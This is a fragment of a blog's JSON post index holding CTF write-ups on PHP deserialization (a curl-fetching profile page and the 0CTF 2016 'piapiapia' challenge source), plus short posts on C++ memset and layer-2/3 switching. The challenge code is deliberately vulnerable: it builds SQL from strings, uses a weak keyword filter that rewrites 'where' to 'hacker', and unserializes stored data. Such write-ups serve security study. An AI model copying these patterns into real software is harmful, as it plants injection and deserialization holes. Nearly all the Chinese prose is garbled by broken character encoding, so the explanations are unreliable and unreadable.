12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879808182838485&lt;?php session_start(); ?&gt;&lt;?php require_once &#x27;db.php&#x27;; ?&gt;&lt;?php require_once &#x27;user.php&#x27;; ?&gt;&lt;?php require_once &#x27;error.php&#x27;; ?&gt;&lt;?php$db = new DB();?&gt;&lt;!doctype html&gt;&lt;html lang=&quot;ko&quot;&gt;&lt;head&gt; &lt;meta charset=&quot;UTF-8&quot;&gt; &lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, user-scalable=no, initial-scale=1.0, maximum-scale=1.0, minimum-scale=1.0&quot;&gt; &lt;meta http-equiv=&quot;X-UA-Compatible&quot; content=&quot;ie=edge&quot;&gt; &lt;title&gt;User&lt;/title&gt; &lt;?php require_once &#x27;bootstrap.php&#x27;; ?&gt;&lt;/head&gt;&lt;body&gt;&lt;?php$no = $_GET[&#x27;no&#x27;];if ($db-&gt;anti_sqli($no))&#123; die(&quot;no hack ~_~&quot;);&#125;$res = $db-&gt;getUserByNo($no);$user = unserialize($res[&#x27;data&#x27;]);//print_r($res);?&gt;&lt;div class=&quot;container&quot;&gt; &lt;table class=&quot;table&quot;&gt; &lt;tr&gt; &lt;th&gt; username &lt;/th&gt; &lt;th&gt; age &lt;/th&gt; &lt;th&gt; blog &lt;/th&gt; &lt;/tr&gt; &lt;tr&gt; &lt;td&gt; &lt;?php echo $res[&#x27;username&#x27;]; ?&gt; &lt;/td&gt; &lt;td&gt; &lt;?php echo $user-&gt;age; ?&gt; &lt;/td&gt; &lt;td&gt; &lt;?php echo xss($user-&gt;blog); ?&gt; &lt;/td&gt; &lt;/tr&gt; &lt;/table&gt; &lt;hr&gt; &lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt; &lt;p&gt;the contents of his/her blog&lt;/p&gt; &lt;hr&gt; &lt;?php $response = $user-&gt;getBlogContents(); if ($response === 404) &#123; echo &quot;404 Not found&quot;; &#125; else &#123; $base64 = base64_encode($response); echo &quot;&lt;iframe width=&#x27;100%&#x27; height=&#x27;10em&#x27; src=&#x27;data:text/html;base64,&#123;$base64&#125;&#x27;&gt;&quot;; // echo $response; &#125; // var_dump($user-&gt;getBlogContents()); ?&gt;&lt;/div&gt;&lt;/body&gt;&lt;/html&gt; å…¶ä¸­ï¼Œ 12$res = $db-&gt;getUserByNo($no);$user = unserialize($res[&#x27;data&#x27;]);//è¿™å¥è¯ä¹Ÿè§£é‡Šäº†ä¸ºä»€ä¹ˆè¦å¯¹åº”ç¬¬å››ä¸ªå­—æ®µã€‚ è¿™ä¸¤å¥è¯å°è¯äº†æˆ‘çš„æ€è·¯ï¼šååºåˆ—åŒ–æ•°æ®åº“ä¸­çš„dataå­—æ®µâ€”å­˜æ”¾çš„userï¼Œååºåˆ—åŒ–åè°ƒç”¨getBlogContents()ï¼Œåœ¨getBlogContents()ä¸­è°ƒç”¨get(user-&gt;blog)ï¼Œåœ¨è¿™é‡Œé¢CURLè¯·æ±‚ï¼Œç„¶ååœ¨å‰ç«¯è¾“å‡ºbase64åŠ å¯†çš„å€¼ã€‚ æ€»ç»“æˆ‘å¤ªèœäº†ã€‚ç»¼åˆåˆ©ç”¨è¿˜æ˜¯ä¸è¡Œï¼Œè¯´æ˜æˆ‘æ¯ä¸ªç‚¹è¿˜æ²¡éƒ½å¼„æ˜ç™½ã€‚å°¤å…¶æ˜¯æ­£åˆ™è¡¨è¾¾å¼ï¼Œåªèƒ½çœ‹ä¸ªå¤§æ¦‚ï¼Œå¤æ‚çš„å°±ä¸æ‡‚äº†ï¼Œè¿˜éœ€è¦ç»§ç»­å­¦ä¹ ","categories":[],"tags":[{"name":"php","slug":"php","permalink":"https://polosec.github.io/tags/php/"},{"name":"mysql","slug":"mysql","permalink":"https://polosec.github.io/tags/mysql/"}]},{"title":"c++ memset","slug":"c-memset","date":"2020-04-20T14:12:08.000Z","updated":"2020-04-20T14:23:06.734Z","comments":true,"path":"2020/04/20/c-memset/","link":"","permalink":"https://polosec.github.io/2020/04/20/c-memset/","excerpt":"","text":"æœ€è¿‘ä¸€ç›´åœ¨åšåŠ¨æ€è§„åˆ’æœ‰å…³çš„é—®é¢˜ï¼Œå¹¶ä¸”ç»å¸¸æ€§çš„éœ€è¦æŠŠdpæ•°ç»„ç½®ä¸º0ï¼Œå°±ç»å¸¸æ€§çš„ç”¨memset(dp,0,sizeof(dp))è¿™ä¹ˆå†™ã€‚ã€‚ç›´åˆ°ä»Šå¤©ã€‚ä»Šå¤©é‡åˆ°äº†ä¸€é“é¢˜ éœ€è¦æŠŠdpæ•°ç»„åˆå§‹åŒ–ä¸º1ï¼Œæˆ‘å°±åƒå¾€å¸¸ä¸€æ ·å†™äº†memset(dp,1,sizeof(dp))ï¼Œä½†æ˜¯æ•´ä½“ä»£ç å†™å®Œåæ€ä¹ˆéƒ½ä¸å¯¹ ç„¶åè¾“å‡ºä¸€çœ‹ä¸€ä¸²å¥‡æ€ªçš„æ•°å­—16843009ã€‚ã€‚ 12345678910#include&lt;bits/stdc++.h&gt;using namespace std;int main() &#123; int a[10]; memset(a,1,sizeof(a)); for(int i=0;i&lt;10;i++) cout&lt;&lt;a[i]&lt;&lt;&quot; &quot;; return 0;&#125; what happened?é¦–å…ˆè¦çŸ¥é“memsetåœ¨å“ªï¼Œåœ¨string.hå¤´æ–‡ä»¶é‡Œé¢ã€‚memsetæ˜¯æŒ‰å­—èŠ‚èµ‹å€¼ï¼Œint4å­—èŠ‚ï¼Œmemset(dp,1,sizeof(dp))è¿™å¥è¯çš„æ„æ€å°±æ˜¯æŠŠæ¯ä¸ªintå‹çš„dpçš„æ¯ä¸ªå­—èŠ‚éƒ½èµ‹å€¼ä¸º00000001ï¼Œé‚£ä¹ˆæ¯ä¸ªintå‹dpå…ƒç´ çš„å€¼ä¸ºï¼š00000001 00000001 00000001 00000001ï¼Œè½¬æ¢æˆåè¿›åˆ¶å°±æ˜¯16843009ã€‚é‚£ä¸ºä»€ä¹ˆèµ‹å€¼0æˆ–è€…-1æ²¡é”™ï¼Ÿå› ä¸º0çš„è¡¥ç æ˜¯00000000ï¼Œ-1çš„è¡¥ç æ˜¯11111111ï¼Œå†ç¿»è¯‘å›å»è¿˜æ˜¯0å’Œ-1ã€‚æ‰€ä»¥é™¤äº†0å’Œ-1èµ‹å€¼çš„è¯å¯ä»¥ç”¨fillã€‚æ¯”å¦‚fill(a,a+n,1)è¿™æ ·å°±å¯ä»¥æŠŠæ•°ç»„açš„æ¯ä¸€ä¸ªå…ƒç´ çš„å€¼éƒ½èµ‹å€¼ä¸º1äº†ã€‚","categories":[],"tags":[{"name":"c++","slug":"c","permalink":"https://polosec.github.io/tags/c/"}]},{"title":"äºŒå±‚äº¤æ¢andä¸‰å±‚äº¤æ¢","slug":"äºŒå±‚äº¤æ¢andä¸‰å±‚äº¤æ¢","date":"2020-04-20T12:31:24.000Z","updated":"2020-04-20T14:10:10.080Z","comments":true,"path":"2020/04/20/äºŒå±‚äº¤æ¢andä¸‰å±‚äº¤æ¢/","link":"","permalink":"https://polosec.github.io/2020/04/20/%E4%BA%8C%E5%B1%82%E4%BA%A4%E6%8D%A2and%E4%B8%89%E5%B1%82%E4%BA%A4%E6%8D%A2/","excerpt":"","text":"äºŒå±‚äº¤æ¢ä¸ä¸‰å±‚äº¤æ¢çš„é—®é¢˜å…¶å®æ˜¯å¶ç„¶çœ‹åˆ°çš„ï¼Œçœ‹æŸæ ¡å¤ä»¤è¥ç»éªŒè´´çœ‹åˆ°æœ‰æé—®è¿™ä¸ªé—®é¢˜ï¼Œæ­£å¥½æˆ‘ä¸ä¼šï¼Œè®°å½•ä¸€ä¸‹ã€‚å‚è€ƒé“¾æ¥ï¼šhttps://zhuanlan.zhihu.com/p/64455461https://blog.csdn.net/Apollon_krj/article/details/82086174https://blog.csdn.net/lycb_gz/article/details/8780851äºŒå±‚äº¤æ¢æœºå·¥ä½œåœ¨æ•°æ®é“¾è·¯å±‚ï¼Œæ ¹æ®MACåœ°å€å¯¹å¸§è¿›è¡Œè½¬å‘ï¼›ä¸‰å±‚äº¤æ¢æœºå·¥ä½œåœ¨ç½‘ç»œå±‚ï¼Œå¯¹äºè·¨ç½‘æ®µçš„é€šä¿¡ï¼Œå¯ä»¥åšåˆ°ä¸€æ¬¡è·¯ç”±ï¼Œå¤šæ¬¡äº¤æ¢ã€‚ ç”¨åˆ°çš„çŸ¥è¯†ç‚¹åœ¨è¯´äºŒä¸‰å±‚è½¬å‘ä¹‹å‰å…ˆæ€»ç»“ä¸€ä¸‹ç”¨åˆ°çš„çŸ¥è¯†ç‚¹ï¼Œè™½ç„¶æˆ‘å­¦è¿‡ä¸€éè®¡ç®—æœºç½‘ç»œï¼Œä½†è‡ªè®¤ä¸ºå­¦çš„å¾ˆèœã€‚ã€‚æœ‰äº›åœ°æ–¹éƒ½å¿˜äº†ã€‚ã€‚ç”šè‡³æŸåè®®é¦–éƒ¨æŸå­—æ®µè¿˜æ²¡è®°ä½233331.ARPARPåè®®æ˜¯ç”±IPåœ°å€è·å¾—MACåœ°å€ï¼Œå‡è®¾ä¸¤å°ä¸»æœºåœ¨åŒä¸€ç½‘æ®µï¼ŒAå‘Bå‘æ¶ˆæ¯ï¼ŒAçŸ¥é“Bçš„IPåœ°å€ ä½†æ˜¯ä¸çŸ¥é“Bçš„macåœ°å€ï¼Œæ‰€ä»¥åœ¨å±€åŸŸç½‘å†…å‘ä¸ªå¹¿æ’­ï¼Œç›®çš„MACå…¨ä¸ºFï¼Œæ„æ€å°±æ˜¯ï¼šâ€œè°çš„IPåœ°å€ä¸º192.168.2.2ï¼Ÿèµ¶ç´§æŠŠmacåœ°å€å‘Šè¯‰æˆ‘â€å±€åŸŸç½‘å†…å…¶ä»–ä¸»æœºçœ‹åˆ°è¿™æ¡æ¶ˆæ¯åå‘ç°ç›®çš„ipä¸æ˜¯è‡ªå·±çš„ï¼Œäºæ˜¯ä¸¢å¼ƒï¼›Bçœ‹åˆ°åå‘ç°æ˜¯æ‰¾çš„è‡ªå·±ï¼Œäºæ˜¯æŠŠè‡ªå·±çš„macåœ°å€å‘ç»™äº†Aï¼Œäºæ­¤åŒæ—¶Båœ¨è‡ªå·±çš„ARPè¡¨ä¸­è®°å½•ä¸‹Açš„IPä¸MACåœ°å€çš„æ˜ å°„å…³ç³»ã€‚Aæ”¶åˆ°Bå‘çš„æ¶ˆæ¯åä¹ŸæŠŠBçš„IPä¸MACçš„æ˜ å°„å…³ç³»è®°å½•åˆ°è‡ªå·±çš„ARPè¡¨ä¸­ã€‚ã€‚è¿™å°±æ˜¯ä¸€æ¬¡ç®€å•çš„ARPè¯·æ±‚2.è·¨ç½‘æ®µé€šä¿¡å‡è®¾Aå’ŒBä¸åœ¨ä¸€ä¸ªç½‘æ®µï¼Œé€šä¿¡è¿‡ç¨‹åº”è¯¥æ˜¯è¿™æ ·ï¼šå…ˆå’Œå­ç½‘æ©ç ç›¸ä¸ï¼Œå‘ç°ä¸åœ¨ä¸€ä¸ªç½‘æ®µï¼Œç„¶åæ‰¾è‡ªå·±çš„ç½‘å…³ï¼ŒæŠŠæ•°æ®å‘ç»™ç½‘å…³è®©ç½‘å…³ä»£ä¸ºè½¬å‘ï¼›åœ¨è¿™ä¸ªè¿‡ç¨‹ä¸­å¦‚æœä¸çŸ¥é“ç½‘å…³çš„MACå°±æ¥ä¸€æ¬¡ARPã€‚å‘é€ç»™ç½‘å…³åï¼ŒæŸ¥ä¸€ä¸‹è·¯ç”±è¡¨ï¼Œçœ‹çœ‹ä¸‹ä¸€è·³è¯¥å‘åˆ°å“ªäº†ï¼Œå°±è¿™æ ·ä¸€ç›´è½¬å‘ï¼ŒæŸ¥æ‰¾ä¸‹ä¸€è·³ï¼Œè½¬å‘ã€‚ã€‚æ— é™å¥—å¨ƒã€‚å¥—åˆ°æœ€åèŠ‚ç‚¹ï¼Œå‘ç°ç›®çš„IPåœ¨è‡ªå·±çš„ç½‘æ®µï¼Œå…ˆçœ‹çœ‹ARPè¡¨æœ‰æ²¡æœ‰è®°å½•ï¼Œæ²¡æœ‰çš„è¯å‘ä¸€æ¬¡ARPè¯·æ±‚ï¼Œæœ‰çš„è¯å°±ç›´æ¥æŠŠè¯·æ±‚å‘ç»™ç›®çš„IPäº†ã€‚3.ARPè¡¨ macè¡¨äºŒå±‚äº¤æ¢æœºç»´æŠ¤MACè¡¨ï¼Œä¸»æœºç»´æŠ¤ARPè¡¨ äºŒå±‚äº¤æ¢äºŒå±‚äº¤æ¢æ˜¯æ•°æ®é“¾è·¯å±‚çš„äº¤æ¢ï¼Œæ ¹æ®macåœ°å€äº¤æ¢ã€‚äºŒå±‚äº¤æ¢é€šä¿¡ä¸èƒ½è·¨ç½‘æ®µï¼ˆæ¯”å¦‚vlanï¼‰ã€‚äºŒå±‚äº¤æ¢æœºç»´æŠ¤çš„MACè¡¨æ˜¯ç«¯å£å’ŒMACåœ°å€çš„æ˜ å°„å…³ç³»ã€‚ ä¸‰å±‚äº¤æ¢ä¸‰å±‚äº¤æ¢åˆè¢«å«åšä¸€æ¬¡è·¯ç”±ï¼Œå¤šæ¬¡äº¤æ¢ã€‚è¿™æ˜¯å•¥æ„æ€ï¼Ÿå…ˆè¯´ä¸€ä¸ªç®€å•çš„ï¼šå‡è®¾ä¸€å°ä¸‰å±‚äº¤æ¢æœºåˆ’åˆ†äº†vlan1å’Œvlan2ï¼Œaåœ¨vlan1ï¼Œbåœ¨vlan2ï¼Œaç¬¬ä¸€æ¬¡ç»™bå‘æ•°æ®çš„æ—¶å€™è¿˜æ˜¯æ­£å¸¸èµ°è·¯ç”±è¡¨ï¼Œç­‰æ•´ä¸ªè¿‡ç¨‹ç»“æŸåä¸‰å±‚äº¤æ¢æœºä¼šè®°å½•ä¸‹ä¸€æ¡æ•°æ®ï¼ŒåŒ…æ‹¬äº†Aå’ŒBçš„macåœ°å€ç«¯å£ç­‰ç›¸å…³ä¿¡æ¯ï¼Œä¸‹æ¬¡Aå’ŒBé€šä¿¡çš„æ—¶å€™ç›´æ¥æ ¹æ®è¿™æ¡æ•°æ®é€šè¿‡äºŒå±‚è½¬å‘äº†ï¼Œå°±ä¸ç”¨å†èµ°è·¯ç”±äº†ã€‚of course,äº‹æƒ…æ²¡æœ‰é‚£ä¹ˆç®€å•ï¼Œtoo simple,sometimes naive!ä¸Šé¢è¿™å¥è¯å°±å›¾ä¸€ä¹ï¼Œå°±åƒé¢è¯•é—®TCP ä¸‰æ¬¡æ¡æ‰‹çš„æ—¶å€™ä½ è¯´â€œå®¢æˆ·ç«¯å‘è¯·æ±‚ï¼ŒæœåŠ¡å™¨å“åº”ï¼Œå®¢æˆ·ç«¯å†å‘ä¸€ä¸ªè¯·æ±‚ï¼Œå»ºç«‹è¿æ¥ã€‚â€ä¸€æ ·ï¼Œå¤ªä¸ä¸“ä¸šäº†ã€‚å¥½çš„ æ¥ä¸‹æ¥è¯´ä¸ªå¤æ‚çš„ã€‚ ä¸‰å±‚äº¤æ¢è·¨ç½‘æ®µé€šä¿¡ä¸»æœºAå’ŒBåœ¨åŒä¸€ä¸ªäº¤æ¢æœºï¼Œä½†æ˜¯åœ¨ä¸åŒvlanã€‚è§‚å¯Ÿaå’Œbçš„é€šä¿¡è¿‡ç¨‹åˆå§‹åŒ–ï¼Œaå‘ç°bå’Œè‡ªå·±ä¸ä¸€ä¸ªç½‘æ®µå¹¶ä¸”ä¸çŸ¥é“ç½‘å…³çš„macï¼Œå¹¿æ’­ä¸€ä¸ªARPï¼Œç›®çš„æ˜¯æ‰¾åˆ°ç½‘å…³çš„MACã€‚ç½‘å…³æ”¶åˆ°ARPè¯·æ±‚åæŠŠè‡ªå·±çš„macåœ°å€å‘ç»™aï¼Œå¹¶ä¸”åœ¨è‡ªå·±çš„arpè¡¨ä¸­è®°å½•aç«¯å£å’Œmacçš„æ˜ å°„å…³ç³»ã€‚ç„¶åæŠŠAçš„IPåœ°å€ï¼ˆä½œä¸ºâ€œç›®çš„IPåœ°å€â€ï¼‰ã€MACåœ°å€ï¼ˆä½œä¸ºâ€œä¸‹ä¸€è·³MACåœ°å€â€ï¼‰ï¼Œä»¥åŠä¸äº¤æ¢æœºç›´æ¥ç›¸è¿çš„ç«¯å£å·ç­‰ä¿¡æ¯ä¸‹å‘åˆ°ä¸‰å±‚äº¤æ¢æœºASICèŠ¯ç‰‡ä¸­çš„ä¸‰å±‚ç¡¬ä»¶è½¬å‘è¡¨ã€‚æ­¤æ—¶åœ¨ä¸‰å±‚ç¡¬ä»¶è½¬å‘è¡¨ä¸­å°±æœ‰äº†ç¬¬ä¸€ä¸ªè½¬å‘è¡¨é¡¹ï¼Œå³Açš„è½¬å‘è¡¨é¡¹ã€‚Aæ”¶åˆ°ç½‘å…³çš„åº”ç­”åï¼ŒæŠŠç›®çš„åœ°å€ä¿®æ”¹é—®ç½‘å…³çš„macï¼Œå¹¶ä¸”æŠŠæ•°æ®åŒ…å‘ç»™ç½‘å…³ç½‘å…³æ”¶åˆ°è¯·æ±‚åï¼Œå…ˆåœ¨ä¸‰å±‚ç¡¬ä»¶è½¬å‘è¡¨ä¸­æŸ¥æ‰¾ä¸Bæœ‰å…³è¡¨é¡¹ï¼Œç”±äºæ˜¯ç¬¬ä¸€æ¬¡é€šä¿¡ï¼Œæ‰€ä»¥æ²¡æœ‰ï¼Œç„¶åè¿›è¡Œè·¯ç”±ã€‚CPUæ ¹æ®ç›®çš„åœ°å€åœ¨router tableä¸­æŸ¥æ‰¾next hopï¼Œå‘ç°äº†ç›´è¿çš„ä¸»æœºbï¼Œç„¶ååœ¨è‡ªå·±çš„arpè¡¨ä¸­æŸ¥bçš„macï¼Œæ²¡æœ‰æŸ¥åˆ°ï¼Œäºæ˜¯å‘ä¸ªå¹¿æ’­ï¼šæ‰¾Bçš„macã€‚Bæ”¶åˆ°ARPè¯·æ±‚åæŠŠè‡ªå·±çš„macå‘ç»™äº¤æ¢æœºï¼Œè‡ªå·±ä¹Ÿç¼“å­˜ä¸‹ã€‚äº¤æ¢æœºæ”¶åˆ°bçš„macåï¼Œåœ¨è‡ªå·±çš„arpè¡¨ä¸­è®°å½•ä¸‹ipä¸macçš„æ˜ å°„ï¼›åœ¨ä¸‰å±‚ç¡¬ä»¶è½¬å‘è¡¨ä¸­æ–°å¢ä¸€é¡¹ï¼š Bçš„IPåœ°å€ã€MACåœ°å€ã€è¿›å…¥äº¤æ¢æœºçš„ç«¯å£å·ç­‰ä¿¡æ¯ã€‚è¿™æ ·å°±å®Œæˆäº†ç¬¬ä¸€æ¬¡Aå’ŒBçš„é€šä¿¡ï¼Œä¸‰å±‚äº¤æ¢æœºçš„ç¡¬ä»¶è½¬å‘è¡¨ä¸­å¤šäº†ä¸¤é¡¹ï¼šåˆ†åˆ«æ˜¯Açš„IP Açš„port Açš„mac Açš„vlan ã€‚ã€‚ã€‚Bçš„IP Bçš„PORT Bçš„MAC Bçš„VLAN ã€‚ã€‚ã€‚ç­‰ä¸‹æ¬¡æœ‰åˆ«çš„ä¸»æœºæƒ³å’ŒAæˆ–è€…Bé€šä¿¡çš„æ—¶å€™ï¼Œç”±äºè¡¨ä¸­æœ‰è®°å½•ï¼Œç›´æ¥èµ°è¡¨ä¸­è®°å½•çš„ç«¯å£è½¬å‘è¿‡å»å°±å¯ä»¥äº†ã€‚å³ ä¸€æ¬¡è·¯ç”±ï¼Œå¤šæ¬¡äº¤æ¢~ï¼ˆé¦–å°¾å‘¼åº”2333 arpå…¨0å’Œå…¨fçš„é—®é¢˜åœ¨ç½‘ç»œå±‚çš„ARPåè®®ï¼ˆTCP/IPæ¨¡å‹ï¼‰ä¸çŸ¥é“ç›®çš„macï¼Œæ‰€ä»¥æŠŠç›®çš„macç½®0ï¼›åˆ°äº†æ•°æ®é“¾è·¯å±‚ç½®ä¸ºå…¨F æ„ä¸ºå¹¿æ’­å¸§â€“æ•°æ®é“¾è·¯å±‚ä¸è®¤è¯†ipã€‚å¦‚æœæœ‰é”™è¯¯æ¬¢è¿æå‡ºï¼Œå…±åŒè¿›æ­¥","categories":[],"tags":[{"name":"web","slug":"web","permalink":"https://polosec.github.io/tags/web/"}]},{"title":"php unserialize","slug":"php-unserialize","date":"2020-04-17T08:44:47.000Z","updated":"2020-04-17T15:49:48.235Z","comments":true,"path":"2020/04/17/php-unserialize/","link":"","permalink":"https://polosec.github.io/2020/04/17/php-unserialize/","excerpt":"","text":"php unserializeä¹‹å‰æ²¡æ€ä¹ˆæ¥è§¦è¿‡PHPååºåˆ—åŒ–çš„é—®é¢˜ï¼Œè¿™ä¸¤å¤©ç¢°å·§åšäº†ä¸€é“å¾€å¹´çš„é¢˜ï¼Œé‡åˆ°äº†ï¼Œç®—æ˜¯åˆæ­¥äº†è§£äº†PHPååºåˆ—åŒ–çš„é—®é¢˜ï¼Œè®°å½•ä¸€ä¸‹è§£å†³æ€è·¯é¢˜ç›®é“¾æ¥ï¼šhttps://buuoj.cn/login?next=%2Fchallenges%3F#%5B0CTF%202016%5Dpiapiapia ç¯å¢ƒæ¢æµ‹PHPç‰ˆæœ¬5.6 æ²¡æœ‰å‘ç°å…¶ä»–æœ‰ç”¨ä¿¡æ¯ç”¨æ‰«æå™¨æ‰«äº†ä¸€ä¸‹å‘ç°äº†ç½‘ç«™å¤‡ä»½ï¼Œä¸‹è½½ä¸‹æ¥ã€‚ 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101&lt;?phpclass.phprequire(&#x27;config.php&#x27;);class user extends mysql&#123; private $table = &#x27;users&#x27;; public function is_exists($username) &#123; $username = parent::filter($username); $where = &quot;username = &#x27;$username&#x27;&quot;; return parent::select($this-&gt;table, $where); &#125; public function register($username, $password) &#123; $username = parent::filter($username); $password = parent::filter($password); $key_list = Array(&#x27;username&#x27;, &#x27;password&#x27;); $value_list = Array($username, md5($password)); return parent::insert($this-&gt;table, $key_list, $value_list); &#125; public function login($username, $password) &#123; $username = parent::filter($username); $password = parent::filter($password); $where = &quot;username = &#x27;$username&#x27;&quot;; $object = parent::select($this-&gt;table, $where); if ($object &amp;&amp; $object-&gt;password === md5($password)) &#123; return true; &#125; else &#123; return false; &#125; &#125; public function show_profile($username) &#123; $username = parent::filter($username); $where = &quot;username = &#x27;$username&#x27;&quot;; $object = parent::select($this-&gt;table, $where); return $object-&gt;profile; &#125; public function update_profile($username, $new_profile) &#123; $username = parent::filter($username); $new_profile = parent::filter($new_profile); $where = &quot;username = &#x27;$username&#x27;&quot;; return parent::update($this-&gt;table, &#x27;profile&#x27;, $new_profile, $where); &#125; public function __tostring() &#123; return __class__; &#125;&#125;class mysql &#123; private $link = null; public function connect($config) &#123; $this-&gt;link = mysql_connect( $config[&#x27;hostname&#x27;], $config[&#x27;username&#x27;], $config[&#x27;password&#x27;] ); mysql_select_db($config[&#x27;database&#x27;]); mysql_query(&quot;SET sql_mode=&#x27;strict_all_tables&#x27;&quot;); return $this-&gt;link; &#125; public function select($table, $where, $ret = &#x27;*&#x27;) &#123; $sql = &quot;SELECT $ret FROM $table WHERE $where&quot;; $result = mysql_query($sql, $this-&gt;link); return mysql_fetch_object($result); &#125; public function insert($table, $key_list, $value_list) &#123; $key = implode(&#x27;,&#x27;, $key_list); $value = &#x27;\\&#x27;&#x27; . implode(&#x27;\\&#x27;,\\&#x27;&#x27;, $value_list) . &#x27;\\&#x27;&#x27;; $sql = &quot;INSERT INTO $table ($key) VALUES ($value)&quot;; return mysql_query($sql); &#125; public function update($table, $key, $value, $where) &#123; $sql = &quot;UPDATE $table SET $key = &#x27;$value&#x27; WHERE $where&quot;; return mysql_query($sql); &#125; public function filter($string) &#123; $escape = array(&#x27;\\&#x27;&#x27;, &#x27;\\\\\\\\&#x27;); $escape = &#x27;/&#x27; . implode(&#x27;|&#x27;, $escape) . &#x27;/&#x27;; $string = preg_replace($escape, &#x27;_&#x27;, $string); $safe = array(&#x27;select&#x27;, &#x27;insert&#x27;, &#x27;update&#x27;, &#x27;delete&#x27;, &#x27;where&#x27;); $safe = &#x27;/&#x27; . implode(&#x27;|&#x27;, $safe) . &#x27;/i&#x27;; return preg_replace($safe, &#x27;hacker&#x27;, $string); &#125; public function __tostring() &#123; return __class__; &#125;&#125;session_start();$user = new user();$user-&gt;connect($config); 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970config.php&lt;?php $config[&#x27;hostname&#x27;] = &#x27;127.0.0.1&#x27;; $config[&#x27;username&#x27;] = &#x27;root&#x27;; $config[&#x27;password&#x27;] = &#x27;&#x27;; $config[&#x27;database&#x27;] = &#x27;&#x27;; $flag = &#x27;&#x27;;?&gt;update.php&lt;?php require_once(&#x27;class.php&#x27;); if($_SESSION[&#x27;username&#x27;] == null) &#123; die(&#x27;Login First&#x27;); &#125; if($_POST[&#x27;phone&#x27;] &amp;&amp; $_POST[&#x27;email&#x27;] &amp;&amp; $_POST[&#x27;nickname&#x27;] &amp;&amp; $_FILES[&#x27;photo&#x27;]) &#123; $username = $_SESSION[&#x27;username&#x27;]; if(!preg_match(&#x27;/^\\d&#123;11&#125;$/&#x27;, $_POST[&#x27;phone&#x27;])) die(&#x27;Invalid phone&#x27;); if(!preg_match(&#x27;/^[_a-zA-Z0-9]&#123;1,10&#125;@[_a-zA-Z0-9]&#123;1,10&#125;\\.[_a-zA-Z0-9]&#123;1,10&#125;$/&#x27;, $_POST[&#x27;email&#x27;])) die(&#x27;Invalid email&#x27;); if(preg_match(&#x27;/[^a-zA-Z0-9_]/&#x27;, $_POST[&#x27;nickname&#x27;]) || strlen($_POST[&#x27;nickname&#x27;]) &gt; 10) die(&#x27;Invalid nickname&#x27;); $file = $_FILES[&#x27;photo&#x27;]; if($file[&#x27;size&#x27;] &lt; 5 or $file[&#x27;size&#x27;] &gt; 1000000) die(&#x27;Photo size error&#x27;); move_uploaded_file($file[&#x27;tmp_name&#x27;], &#x27;upload/&#x27; . md5($file[&#x27;name&#x27;])); $profile[&#x27;phone&#x27;] = $_POST[&#x27;phone&#x27;]; $profile[&#x27;email&#x27;] = $_POST[&#x27;email&#x27;]; $profile[&#x27;nickname&#x27;] = $_POST[&#x27;nickname&#x27;]; $profile[&#x27;photo&#x27;] = &#x27;upload/&#x27; . md5($file[&#x27;name&#x27;]); $user-&gt;update_profile($username, serialize($profile)); echo &#x27;Update Profile Success!&lt;a href=&quot;profile.php&quot;&gt;Your Profile&lt;/a&gt;&#x27;; &#125; else &#123;?&gt;&lt;!DOCTYPE html&gt;&lt;html&gt;&lt;head&gt; &lt;title&gt;UPDATE&lt;/title&gt; &lt;link href=&quot;static/bootstrap.min.css&quot; rel=&quot;stylesheet&quot;&gt; &lt;script src=&quot;static/jquery.min.js&quot;&gt;&lt;/script&gt; &lt;script src=&quot;static/bootstrap.min.js&quot;&gt;&lt;/script&gt;&lt;/head&gt;&lt;body&gt; &lt;div class=&quot;container&quot; style=&quot;margin-top:100px&quot;&gt; &lt;form action=&quot;update.php&quot; method=&quot;post&quot; enctype=&quot;multipart/form-data&quot; class=&quot;well&quot; style=&quot;width:220px;margin:0px auto;&quot;&gt; &lt;img src=&quot;static/piapiapia.gif&quot; class=&quot;img-memeda &quot; style=&quot;width:180px;margin:0px auto;&quot;&gt; &lt;h3&gt;Please Update Your Profile&lt;/h3&gt; &lt;label&gt;Phone:&lt;/label&gt; &lt;input type=&quot;text&quot; name=&quot;phone&quot; style=&quot;height:30px&quot;class=&quot;span3&quot;/&gt; &lt;label&gt;Email:&lt;/label&gt; &lt;input type=&quot;text&quot; name=&quot;email&quot; style=&quot;height:30px&quot;class=&quot;span3&quot;/&gt; &lt;label&gt;Nickname:&lt;/label&gt; &lt;input type=&quot;text&quot; name=&quot;nickname&quot; style=&quot;height:30px&quot; class=&quot;span3&quot;&gt; &lt;label for=&quot;file&quot;&gt;Photo:&lt;/label&gt; &lt;input type=&quot;file&quot; name=&quot;photo&quot; style=&quot;height:30px&quot;class=&quot;span3&quot;/&gt; &lt;button type=&quot;submit&quot; class=&quot;btn btn-primary&quot;&gt;UPDATE&lt;/button&gt; &lt;/form&gt; &lt;/div&gt;&lt;/body&gt;&lt;/html&gt;&lt;?php &#125;?&gt; é˜…è¯»æºç åå‘ç°å…¶èµ„æ–™æ›´æ–°æµç¨‹æ˜¯è¿™æ ·çš„ï¼šåœ¨update.phpç‚¹å‡»æ›´æ–°èµ„æ–™åï¼Œåœ¨æœ¬é¡µé¢å¤„ç†ï¼Œç»è¿‡æ­£åˆ™è¡¨è¾¾å¼è¿‡æ»¤åé€šè¿‡çš„è¯ï¼Œåœ¨userç±»ä¸­çš„update_profileæ–¹æ³•ä¸­æ‰§è¡Œåºåˆ—åŒ–åçš„profile$user-&gt;update_profile($username, serialize($profile));è·Ÿè¿›user-&gt;update_profileæ–¹æ³•ï¼šç”¨æˆ·åå’Œèµ„æ–™ç»è¿‡è¿‡æ»¤å™¨fileterè¿‡æ»¤åç›´æ¥ä¸¢ç»™mysqlæ›´æ–°,ç»§ç»­è·Ÿè¿›filterä¸»è¦æ˜¯æ­£åˆ™æ›¿æ¢ã€‚æŠŠå±é™©å­—æ®µæ›¿æ¢ä¸ºâ€œhackerâ€ã€‚è¿™é‡Œæœ‰é—®é¢˜ã€‚æš‚æ—¶ä¸ç®¡ï¼Œç»§ç»­è·Ÿè¿›ã€‚é¡ºåˆ©é€šè¿‡filterååˆ™å¯é¡ºåˆ©æ›´æ–°ç”¨æˆ·èµ„æ–™ã€‚å†çœ‹profile.phpé‡Œé¢è¿™å¥è¯:$photo = 